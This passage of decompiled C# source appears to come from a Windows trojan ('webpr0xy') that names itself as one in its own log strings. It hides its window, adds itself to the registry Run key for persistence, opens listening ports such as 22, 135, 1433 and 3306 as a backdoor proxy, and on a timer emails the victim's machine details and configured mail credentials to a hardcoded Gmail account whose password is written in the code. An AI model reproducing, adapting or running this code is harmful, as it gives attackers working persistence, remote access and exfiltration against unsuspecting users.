		lstDebug = new ListBox();
		mnuLog = new ContextMenuStrip(components);
		mnuClearLog = new ToolStripMenuItem();
		tmrStatus = new Timer(components);
		chkTopMost = new CheckBox();
		((Control)mnuLog).SuspendLayout();
		((Control)this).SuspendLayout();
		((ButtonBase)btnStart).set_FlatStyle((FlatStyle)0);
		Button obj = btnStart;
		Point location = new Point(12, 12);
		((Control)obj).set_Location(location);
		((Control)btnStart).set_Name("btnStart");
		Button obj2 = btnStart;
		Size size = new Size(88, 27);
		((Control)obj2).set_Size(size);
		((Control)btnStart).set_TabIndex(0);
		((ButtonBase)btnStart).set_Text("Start");
		((ButtonBase)btnStart).set_UseVisualStyleBackColor(true);
		((ButtonBase)btnStop).set_FlatStyle((FlatStyle)0);
		Button obj3 = btnStop;
		location = new Point(12, 12);
		((Control)obj3).set_Location(location);
		((Control)btnStop).set_Name("btnStop");
		Button obj4 = btnStop;
		size = new Size(88, 27);
		((Control)obj4).set_Size(size);
		((Control)btnStop).set_TabIndex(1);
		((ButtonBase)btnStop).set_Text("Stop");
		((ButtonBase)btnStop).set_UseVisualStyleBackColor(true);
		((Control)btnStop).set_Visible(false);
		((Control)btnExit).set_Anchor((AnchorStyles)9);
		((ButtonBase)btnExit).set_FlatStyle((FlatStyle)0);
		Button obj5 = btnExit;
		location = new Point(543, 12);
		((Control)obj5).set_Location(location);
		((Control)btnExit).set_Name("btnExit");
		Button obj6 = btnExit;
		size = new Size(88, 27);
		((Control)obj6).set_Size(size);
		((Control)btnExit).set_TabIndex(2);
		((ButtonBase)btnExit).set_Text("Exit");
		((ButtonBase)btnExit).set_UseVisualStyleBackColor(true);
		lstDebug.set_BackColor(Color.FromArgb(64, 64, 64));
		lstDebug.set_BorderStyle((BorderStyle)0);
		((Control)lstDebug).set_ContextMenuStrip(mnuLog);
		((Control)lstDebug).set_Dock((DockStyle)2);
		lstDebug.set_ForeColor(Color.Lime);
		((ListControl)lstDebug).set_FormattingEnabled(true);
		lstDebug.set_HorizontalScrollbar(true);
		lstDebug.set_IntegralHeight(false);
		ListBox obj7 = lstDebug;
		location = new Point(0, 45);
		((Control)obj7).set_Location(location);
		((Control)lstDebug).set_Name("lstDebug");
		ListBox obj8 = lstDebug;
		size = new Size(643, 252);
		((Control)obj8).set_Size(size);
		((Control)lstDebug).set_TabIndex(3);
		((ToolStrip)mnuLog).get_Items().AddRange((ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)mnuClearLog });
		((Control)mnuLog).set_Name("mnuLog");
		ContextMenuStrip obj9 = mnuLog;
		size = new Size(131, 26);
		((Control)obj9).set_Size(size);
		((ToolStripItem)mnuClearLog).set_Name("mnuClearLog");
		ToolStripMenuItem obj10 = mnuClearLog;
		size = new Size(130, 22);
		((ToolStripItem)obj10).set_Size(size);
		((ToolStripItem)mnuClearLog).set_Text("Clear Log");
		tmrStatus.set_Interval(60000);
		((ButtonBase)chkTopMost).set_AutoSize(true);
		chkTopMost.set_Checked(true);
		chkTopMost.set_CheckState((CheckState)1);
		CheckBox obj11 = chkTopMost;
		location = new Point(119, 18);
		((Control)obj11).set_Location(location);
		((Control)chkTopMost).set_Name("chkTopMost");
		CheckBox obj12 = chkTopMost;
		size = new Size(114, 17);
		((Control)obj12).set_Size(size);
		((Control)chkTopMost).set_TabIndex(4);
		((ButtonBase)chkTopMost).set_Text("Top most windows");
		((ButtonBase)chkTopMost).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImageLayout((ImageLayout)0);
		size = new Size(643, 297);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)chkTopMost);
		((Control)this).get_Controls().Add((Control)(object)lstDebug);
		((Control)this).get_Controls().Add((Control)(object)btnStop);
		((Control)this).get_Controls().Add((Control)(object)btnStart);
		((Control)this).get_Controls().Add((Control)(object)btnExit);
		((Control)this).set_Font(new Font("Tahoma", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)this).set_ForeColor(Color.Lime);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("frmMain");
		((Form)this).set_Opacity(0.8);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_TopMost(true);
		((Control)mnuLog).ResumeLayout(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	internal void DebugLog(string sData)
	{
	}

	public frmMain()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		int try0006_dispatch = -1;
		int num2 = default(int);
		int num = default(int);
		int num3 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				Size size;
				switch (try0006_dispatch)
				{
				default:
					((Form)this).add_Load((EventHandler)frmMain_Load);
					((Form)this).add_FormClosing(new FormClosingEventHandler(frmMain_FormClosing));
					goto IL_002c;
				case 229:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0006;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0034;
						case 3:
							goto IL_003c;
						case 4:
							goto IL_0044;
						case 5:
							goto IL_004c;
						case 6:
							goto IL_0055;
						case 7:
							goto IL_0067;
						case 8:
							goto IL_0070;
						case 9:
							goto IL_0079;
						case 10:
							goto IL_0083;
						case 11:
							goto end_IL_0006_2;
						default:
							goto end_IL_0006;
						case 12:
							goto end_IL_0006_3;
						}
						goto IL_002c;
					}
					IL_0083:
					num = 10;
					DebugLog(((Form)this).get_Text());
					break;
					IL_0079:
					num = 9;
					((Form)this).set_Text((string)null);
					goto IL_0083;
					IL_002c:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0034;
					IL_0034:
					num = 2;
					InitializeComponent();
					goto IL_003c;
					IL_003c:
					num = 3;
					modGlobal.MY_BASE = this;
					goto IL_0044;
					IL_0044:
					num = 4;
					LoadSettings();
					goto IL_004c;
					IL_004c:
					num = 5;
					((Form)this).set_ShowInTaskbar(false);
					goto IL_0055;
					IL_0055:
					num = 6;
					size = new Size(0, 0);
					((Form)this).set_Size(size);
					goto IL_0067;
					IL_0067:
					num = 7;
					((Form)this).set_WindowState((FormWindowState)1);
					goto IL_0070;
					IL_0070:
					num = 8;
					((Control)this).set_Visible(false);
					goto IL_0079;
					end_IL_0006_2:
					break;
				}
				num = 11;
				DebugLog("** Trojan Initialized");
				break;
				end_IL_0006:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0006_dispatch = 229;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0006_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void frmMain_Load(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 111:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0010;
						case 4:
							goto IL_001a;
						case 5:
							goto IL_0022;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0022:
					num = 5;
					tmrStatus.set_Interval(120000);
					break;
					IL_001a:
					num = 4;
					StartServer();
					goto IL_0022;
					IL_0008:
					num = 2;
					AutoRunAdicionar();
					goto IL_0010;
					IL_0010:
					num = 3;
					tmrStatus_Tick(null, null);
					goto IL_001a;
					end_IL_0000_2:
					break;
				}
				num = 6;
				tmrStatus.Start();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 111;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void frmMain_FormClosing(object sender, FormClosingEventArgs e)
	{
		StopServer();
	}

	private void AutoRunAdicionar()
	{
		try
		{
			Reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			Reg.SetValue("pr0xy x", Application.get_ExecutablePath());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void AutoRunRemove()
	{
		try
		{
			Reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			Reg.SetValue("pr0xy x", "");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private bool CheckAutoRun()
	{
		bool result = default(bool);
		try
		{
			Reg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (Operators.CompareString(Reg.GetValue("pr0xy x")!.ToString(), "", false) != 0)
			{
				result = true;
				return result;
			}
			result = false;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void StartServer()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		int num6 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0008;
					case 334:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0008;
							case 3:
							case 5:
								goto IL_0022;
							case 6:
								goto IL_0039;
							case 7:
								goto IL_004e;
							case 8:
								goto IL_006b;
							case 9:
								goto IL_007b;
							case 10:
								goto IL_008e;
							case 12:
								goto IL_00b1;
							case 13:
								goto IL_00b5;
							case 11:
							case 14:
							case 15:
							case 16:
								goto IL_00e8;
							default:
								goto end_IL_0000;
							case 17:
								goto end_IL_0000_2;
							}
							goto default;
						}
						IL_00e8:
						num = 16;
						num5++;
						goto IL_0032;
						IL_00b5:
						num = 13;
						DebugLog("**Listen Failed: " + LISTENING_PORTS[num5].ToString() + " - Description: " + __LISTEN_PORT[num5].LastErr);
						goto IL_00e8;
						IL_0008:
						num = 2;
						__LISTEN_PORT = new ListenPort[LISTENING_PORTS.Length - 1 + 1];
						goto IL_0022;
						IL_0022:
						num = 5;
						num6 = LISTENING_PORTS.Length - 1;
						num5 = 0;
						goto IL_0032;
						IL_0032:
						if (num5 > num6)
						{
							goto end_IL_0000_2;
						}
						goto IL_0039;
						IL_0039:
						num = 6;
						if (Versioned.IsNumeric((object)LISTENING_PORTS[num5]))
						{
							goto IL_004e;
						}
						goto IL_00e8;
						IL_004e:
						num = 7;
						__LISTEN_PORT[num5] = new ListenPort(Conversions.ToInteger(LISTENING_PORTS[num5]));
						goto IL_006b;
						IL_006b:
						num = 8;
						__LISTEN_PORT[num5].Start();
						goto IL_007b;
						IL_007b:
						num = 9;
						if (__LISTEN_PORT[num5].Listening)
						{
							goto IL_008e;
						}
						goto IL_00b1;
						IL_008e:
						num = 10;
						DebugLog("**Listen Port: " + LISTENING_PORTS[num5].ToString());
						goto IL_00e8;
						IL_00b1:
						num = 12;
						goto IL_00b5;
						end_IL_0000:
						break;
					}
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 334;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void StopServer()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		int num6 = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0008;
				case 129:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_001a;
						case 4:
							goto IL_002a;
						case 5:
							goto IL_003a;
						case 6:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_003a:
					num = 5;
					num5 = checked(num5 + 1);
					goto IL_0041;
					IL_002a:
					num = 4;
					__LISTEN_PORT[num5].Dispose();
					goto IL_003a;
					IL_0008:
					num = 2;
					num6 = checked(LISTENING_PORTS.Length - 1);
					num5 = 0;
					goto IL_0041;
					IL_0041:
					if (num5 > num6)
					{
						break;
					}
					goto IL_001a;
					IL_001a:
					num = 3;
					__LISTEN_PORT[num5].Stop();
					goto IL_002a;
					end_IL_0000_2:
					break;
				}
				num = 6;
				DebugLog("**Stop Listening..");
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 129;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void LoadSettings()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		byte[] bytes = default(byte[]);
		string @string = default(string);
		int num5 = default(int);
		int num6 = default(int);
		string text = default(string);
		string[] array = default(string[]);
		string[] array2 = default(string[]);
		int num7 = default(int);
		string text2 = default(string);
		bool flag = default(bool);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				checked
				{
					switch (try0000_dispatch)
					{
					default:
						ProjectData.ClearProjectError();
						num3 = -2;
						goto IL_0009;
					case 2032:
						{
							num2 = num;
							if (num3 > -2)
							{
								switch (num3)
								{
								case 1:
									break;
								default:
									goto end_IL_0000;
								}
							}
							int num4 = unchecked(num2 + 1);
							num2 = 0;
							switch (num4)
							{
							case 1:
								break;
							case 2:
								goto IL_0009;
							case 3:
								goto IL_0017;
							case 4:
								goto IL_0027;
							case 5:
								goto IL_0042;
							case 6:
								goto IL_0052;
							case 7:
								goto IL_0061;
							case 8:
								goto IL_007c;
							case 9:
								goto IL_008b;
							case 10:
								goto IL_008f;
							case 11:
								goto IL_00ac;
							case 13:
							case 14:
								goto IL_00b3;
							case 15:
								goto IL_00c7;
							case 16:
								goto IL_00da;
							case 17:
								goto IL_00fc;
							case 19:
								goto IL_0120;
							case 20:
								goto IL_0134;
							case 21:
								goto IL_0147;
							case 22:
								goto IL_0169;
							case 24:
								goto IL_018d;
							case 25:
								goto IL_01a1;
							case 26:
								goto IL_01b4;
							case 27:
								goto IL_01d6;
							case 29:
								goto IL_01fa;
							case 30:
								goto IL_020e;
							case 31:
								goto IL_0221;
							case 32:
								goto IL_0243;
							case 34:
								goto IL_0267;
							case 35:
								goto IL_027b;
							case 36:
								goto IL_028e;
							case 37:
								goto IL_02af;
							case 39:
								goto IL_02d5;
							case 40:
								goto IL_02e9;
							case 41:
								goto IL_02fc;
							case 42:
								goto IL_031e;
							case 44:
								goto IL_0342;
							case 45:
								goto IL_0356;
							case 46:
								goto IL_0369;
							case 47:
								goto IL_038a;
							case 49:
								goto IL_03b0;
							case 50:
								goto IL_03c4;
							case 51:
								goto IL_03d7;
							case 52:
								goto IL_03f9;
							case 54:
								goto IL_041d;
							case 55:
								goto IL_0431;
							case 56:
								goto IL_0444;
							case 57:
								goto IL_0460;
							case 59:
								goto IL_0486;
							case 60:
								goto IL_049a;
							case 61:
								goto IL_04ad;
							case 62:
								goto IL_04cf;
							case 64:
								goto IL_04f3;
							case 65:
								goto IL_0507;
							case 66:
								goto IL_051a;
							case 67:
								goto IL_053c;
							case 69:
								goto IL_055d;
							case 70:
								goto IL_0571;
							case 71:
								goto IL_0584;
							case 72:
								goto IL_05a6;
							case 74:
								goto IL_05c7;
							case 12:
							case 18:
							case 23:
							case 28:
							case 33:
							case 38:
							case 43:
							case 48:
							case 53:
							case 58:
							case 63:
							case 68:
							case 73:
								goto IL_05d0;
							case 75:
								goto IL_05d8;
							case 76:
								goto IL_05f3;
							case 77:
							case 78:
								goto IL_0607;
							case 79:
								goto IL_061d;
							case 80:
							case 81:
								goto IL_0631;
							case 82:
								goto IL_0643;
							case 83:
							case 84:
								goto end_IL_0000_2;
							default:
								goto end_IL_0000;
							case 85:
							case 86:
								goto end_IL_0000_3;
							}
							goto default;
						}
						IL_0631:
						num = 81;
						if (__Settings.MailPort != 0)
						{
							break;
						}
						goto IL_0643;
						IL_061d:
						num = 79;
						__Settings.LesteningPorts = "10;21;22;80;81;135;136;411;412;666;1433;1434;2012;2013;3306;3307;3308;3309";
						goto IL_0631;
						IL_0009:
						num = 2;
						bytes = File.ReadAllBytes(Application.get_ExecutablePath());
						goto IL_0017;
						IL_0017:
						num = 3;
						@string = Encoding.ASCII.GetString(bytes);
						goto IL_0027;
						IL_0027:
						num = 4;
						num5 = @string.IndexOf("|[START]|") + "|[START]|".Length;
						goto IL_0042;
						IL_0042:
						num = 5;
						num6 = @string.IndexOf("|[END]|");
						goto IL_0052;
						IL_0052:
						num = 6;
						text = @string.Substring(num5, num6 - num5);
						goto IL_0061;
						IL_0061:
						num = 7;
						array = text.Split(new char[1] { '#' });
						goto IL_007c;
						IL_007c:
						num = 8;
						__Settings = default(Trojan);
						goto IL_008b;
						IL_008b:
						num = 9;
						goto IL_008f;
						IL_008f:
						num = 10;
						array2 = array;
						num7 = 0;
						goto IL_009a;
						IL_009a:
						if (num7 < array2.Length)
						{
							text2 = array2[num7];
							goto IL_00ac;
						}
						goto IL_05d8;
						IL_0643:
						num = 82;
						__Settings.MailPort = 587;
						break;
						IL_00ac:
						num = 11;
						flag = true;
						goto IL_00b3;
						IL_00b3:
						num = 14;
						if (flag == text2.Contains("[MailHost]="))
						{
							goto IL_00c7;
						}
						goto IL_0120;
						IL_00c7:
						num = 15;
						num5 = text2.IndexOf("=") + 1;
						goto IL_00da;
						IL_00da:
						num = 16;
						__Settings.MailHost = HexToString(text2.Substring(num5).Trim());
						goto IL_00fc;
						IL_00fc:
						num = 17;
						DebugLog("**MailHost: " + __Settings.MailHost);
						goto IL_05d0;
						IL_0120:
						num = 19;
						if (flag == text2.Contains("[MailUser]="))
						{
							goto IL_0134;
						}
						goto IL_018d;
						IL_0134:
						num = 20;
						num5 = text2.IndexOf("=") + 1;
						goto IL_0147;
						IL_0147:
						num = 21;
						__Settings.MailUser = HexToString(text2.Substring(num5).Trim());
						goto IL_0169;
						IL_0169:
						num = 22;
						DebugLog("**MailUser: " + __Settings.MailUser);
						goto IL_05d0;
						IL_018d:
						num = 24;
						if (flag == text2.Contains("[MailPassword]="))
						{
							goto IL_01a1;
						}
						goto IL_01fa;
						IL_01a1:
						num = 25;
						num5 = text2.IndexOf("=") + 1;
						goto IL_01b4;
						IL_01b4:
						num = 26;
						__Settings.MailPassword = HexToString(text2.Substring(num5).Trim());
						goto IL_01d6;
						IL_01d6:
						num = 27;
						DebugLog("**MailPassword: " + __Settings.MailPassword);
						goto IL_05d0;
						IL_01fa:
						num = 29;
						if (flag == text2.Contains("[MailFrom]="))
						{
							goto IL_020e;
						}
						goto IL_0267;
						IL_020e:
						num = 30;
						num5 = text2.IndexOf("=") + 1;
						goto IL_0221;
						IL_0221:
						num = 31;
						__Settings.MailFrom = HexToString(text2.Substring(num5).Trim());
						goto IL_0243;
						IL_0243:
						num = 32;
						DebugLog("**MailFrom: " + __Settings.MailFrom);
						goto IL_05d0;
						IL_0267:
						num = 34;
						if (flag == text2.Contains("[MailPort]="))
						{
							goto IL_027b;
						}
						goto IL_02d5;
						IL_027b:
						num = 35;
						num5 = text2.IndexOf("=") + 1;
						goto IL_028e;
						IL_028e:
						num = 36;
						__Settings.MailPort = Conversions.ToInteger(text2.Substring(num5).Trim());
						goto IL_02af;
						IL_02af:
						num = 37;
						DebugLog("**MailPort: " + text2.Substring(num5).Trim());
						goto IL_05d0;
						IL_02d5:
						num = 39;
						if (flag == text2.Contains("[MailSubject]="))
						{
							goto IL_02e9;
						}
						goto IL_0342;
						IL_02e9:
						num = 40;
						num5 = text2.IndexOf("=") + 1;
						goto IL_02fc;
						IL_02fc:
						num = 41;
						__Settings.MailSubject = HexToString(text2.Substring(num5).Trim());
						goto IL_031e;
						IL_031e:
						num = 42;
						DebugLog("**MailSubject: " + __Settings.MailSubject);
						goto IL_05d0;
						IL_0342:
						num = 44;
						if (flag == text2.Contains("[MailTimeout]="))
						{
							goto IL_0356;
						}
						goto IL_03b0;
						IL_0356:
						num = 45;
						num5 = text2.IndexOf("=") + 1;
						goto IL_0369;
						IL_0369:
						num = 46;
						__Settings.MailTimeOut = Conversions.ToInteger(text2.Substring(num5).Trim());
						goto IL_038a;
						IL_038a:
						num = 47;
						DebugLog("**MailTimeout: " + text2.Substring(num5).Trim());
						goto IL_05d0;
						IL_03b0:
						num = 49;
						if (flag == text2.Contains("[DetectIP]="))
						{
							goto IL_03c4;
						}
						goto IL_041d;
						IL_03c4:
						num = 50;
						num5 = text2.IndexOf("=") + 1;
						goto IL_03d7;
						IL_03d7:
						num = 51;
						__Settings.DetectIP = HexToString(text2.Substring(num5).Trim());
						goto IL_03f9;
						IL_03f9:
						num = 52;
						DebugLog("**DetectIP: " + __Settings.DetectIP);
						goto IL_05d0;
						IL_041d:
						num = 54;
						if (flag == text2.Contains("[ListeningPorts]="))
						{
							goto IL_0431;
						}
						goto IL_0486;
						IL_0431:
						num = 55;
						num5 = text2.IndexOf("=") + 1;
						goto IL_0444;
						IL_0444:
						num = 56;
						__Settings.LesteningPorts = text2.Substring(num5).Trim();
						goto IL_0460;
						IL_0460:
						num = 57;
						DebugLog("**ListeningPorts: " + text2.Substring(num5).Trim());
						goto IL_05d0;
						IL_0486:
						num = 59;
						if (flag == text2.Contains("[ServiceName]="))
						{
							goto IL_049a;
						}
						goto IL_04f3;
						IL_049a:
						num = 60;
						num5 = text2.IndexOf("=") + 1;
						goto IL_04ad;
						IL_04ad:
						num = 61;
						__Settings.ServiceName = HexToString(text2.Substring(num5).Trim());
						goto IL_04cf;
						IL_04cf:
						num = 62;
						DebugLog("**ServiceName: " + __Settings.ServiceName);
						goto IL_05d0;
						IL_04f3:
						num = 64;
						if (flag == text2.Contains("[ServiceDisplayName]="))
						{
							goto IL_0507;
						}
						goto IL_055d;
						IL_0507:
						num = 65;
						num5 = text2.IndexOf("=") + 1;
						goto IL_051a;
						IL_051a:
						num = 66;
						__Settings.ServiceDisplayName = HexToString(text2.Substring(num5).Trim());
						goto IL_053c;
						IL_053c:
						num = 67;
						DebugLog("**ServiceDisplayName: " + __Settings.ServiceDisplayName);
						goto IL_05d0;
						IL_055d:
						num = 69;
						if (flag == text2.Contains("[ServiceDescription]="))
						{
							goto IL_0571;
						}
						goto IL_05d0;
						IL_0571:
						num = 70;
						num5 = text2.IndexOf("=") + 1;
						goto IL_0584;
						IL_0584:
						num = 71;
						__Settings.ServiceDescription = HexToString(text2.Substring(num5).Trim());
						goto IL_05a6;
						IL_05a6:
						num = 72;
						DebugLog("**ServiceDescription: " + __Settings.ServiceDescription);
						goto IL_05d0;
						IL_05d0:
						num7++;
						goto IL_05c7;
						IL_05c7:
						num = 74;
						goto IL_009a;
						IL_05d8:
						num = 75;
						if (!__Settings.DetectIP.StartsWith("http"))
						{
							goto IL_05f3;
						}
						goto IL_0607;
						IL_05f3:
						num = 76;
						__Settings.DetectIP = "http://whatismyip.com/automation/n09230945.asp";
						goto IL_0607;
						IL_0607:
						num = 78;
						if (!string.IsNullOrEmpty(__Settings.LesteningPorts))
						{
							goto IL_061d;
						}
						goto IL_0631;
						end_IL_0000_2:
						break;
					}
					num = 84;
					LISTENING_PORTS = __Settings.LesteningPorts.Split(new char[1] { ';' });
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 2032;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private void tmrStatus_Tick(object sender, EventArgs e)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		Mail mail = default(Mail);
		Mail mail2 = default(Mail);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 768:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0012;
						case 4:
						case 5:
							goto IL_0043;
						case 6:
							goto IL_0058;
						case 7:
							goto IL_0061;
						case 8:
							goto IL_0080;
						case 9:
							goto IL_01ad;
						case 10:
							goto IL_01ee;
						case 11:
						case 12:
							goto IL_0226;
						case 13:
							goto IL_023f;
						case 14:
							goto IL_024d;
						case 15:
							goto IL_0257;
						case 16:
							goto IL_0260;
						case 17:
							goto IL_026a;
						case 19:
							goto IL_027a;
						case 20:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 18:
						case 21:
						case 22:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_027a:
					num = 19;
					break;
					IL_026a:
					num = 17;
					_0024STATIC_0024tmrStatus_Tick_002420211C123D_0024bytTick = 0;
					goto end_IL_0000_3;
					IL_0009:
					num = 2;
					text = "";
					goto IL_0012;
					IL_0012:
					num = 3;
					using (WebClient webClient = new WebClient())
					{
						text = Encoding.ASCII.GetString(webClient.DownloadData(__Settings.DetectIP));
					}
					goto IL_0043;
					IL_0043:
					num = 5;
					if (Operators.CompareString(modGlobal.MY_IP_ADDRESS, text, false) != 0)
					{
						goto IL_0058;
					}
					goto IL_0226;
					IL_0058:
					num = 6;
					modGlobal.MY_IP_ADDRESS = text;
					goto IL_0061;
					IL_0061:
					num = 7;
					mail = new Mail("smtp.gmail.com", "0x664c615368@gmail.com", "123456abc");
					goto IL_0080;
					IL_0080:
					num = 8;
					mail.SendMail("webpr0xy@trojan.com", "0x664c615368@gmail.com", "Trojaned Client [" + UserInfo.ComputerName + "|" + UserInfo.UICulture + "]", UserInfo.ToString(b: true) + "\r\n\r\n------------------ C h 3 4 t ------------------\r\nMailHost: " + __Settings.MailHost + "\r\nMailUser: " + __Settings.MailUser + "\r\nMailPassword: " + __Settings.MailPassword + "\r\nMailTimeOut: " + Conversions.ToString(__Settings.MailTimeOut) + "\r\n\r\nMailFrom: " + __Settings.MailFrom + "\r\nMailUser: " + __Settings.MailUser + "\r\nMailSubject: " + __Settings.MailSubject + "\r\n------------------ C h 3 4 t ------------------");
					goto IL_01ad;
					IL_01ad:
					num = 9;
					mail2 = new Mail(__Settings.MailHost, __Settings.MailUser, __Settings.MailPassword, __Settings.MailPort, __Settings.MailTimeOut);
					goto IL_01ee;
					IL_01ee:
					num = 10;
					mail2.SendMail(__Settings.MailFrom, __Settings.MailUser, __Settings.MailSubject, UserInfo.ToString(b: false));
					goto IL_0226;
					IL_0226:
					num = 12;
					DebugLog("** Trojan IP: " + modGlobal.MY_IP_ADDRESS);
					goto IL_023f;
					IL_023f:
					num = 13;
					if (_0024STATIC_0024tmrStatus_Tick_002420211C123D_0024bytTick >= 15)
					{
						goto IL_024d;
					}
					goto IL_027a;
					IL_024d:
					num = 14;
					StopServer();
					goto IL_0257;
					IL_0257:
					num = 15;
					Application.DoEvents();
					goto IL_0260;
					IL_0260:
					num = 16;
					StartServer();
					goto IL_026a;
					end_IL_0000_2:
					break;
				}
				num = 20;
				checked
				{
					_0024STATIC_0024tmrStatus_Tick_002420211C123D_0024bytTick++;
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 768;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	internal string FormatBytes(double dblBytes)
	{
		if (dblBytes >= 1125899906842624.0)
		{
